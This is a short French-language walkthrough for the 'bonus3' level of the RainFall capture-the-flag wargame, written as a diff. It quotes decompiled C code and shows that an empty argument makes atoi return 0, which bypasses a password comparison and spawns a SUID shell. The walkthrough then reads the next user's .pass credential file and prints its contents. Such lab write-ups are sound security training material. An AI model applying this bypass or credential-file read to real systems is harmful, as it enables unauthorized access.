@@ -1,0 +1,30 @@
+Connexion au bonu3 -> Bit NX active
+Chech du home et des permissions du binaire -> Bit SUID end
+Exection du binaire -> 
+"""
+bonus3@RainFall:~$ ./bonus3
+bonus3@RainFall:~$ ./bonus3 A
+
+"""
+
+"""
+			fread(a1, 1, 66, fd);
+			a1[65] = '\0';
+			a1[atoi(argv[1])] = '\0';
+"""
+"""
+			if (!strcmp(argv[1], a1))
+			{
+				execl("sh", "/bin/sh", 0);
+			}
+"""
+
+Pour rentrer dans le if faudrait connaitre le mot de passe de l'utilisateur 'end' (la bonne blague)
+
+Heuresement on peut reduire la taille contenu dans a1 grace au 'atoi' mais il faut que le reste contenu dans l'argument 1 soit egal au debut du mot de passe... Ce qui est forcement le cas si atoi renvoi 0 est que l'argument est vide
+
+bonus3@RainFall:~$ ./bonus3 ''
+$ pwd
+/home/user/bonus3
+$ cat /home/user/end/.pass
+3321b6f81659f9a71c76616f606e4b50189cecfea611393d5d649f75e157353c
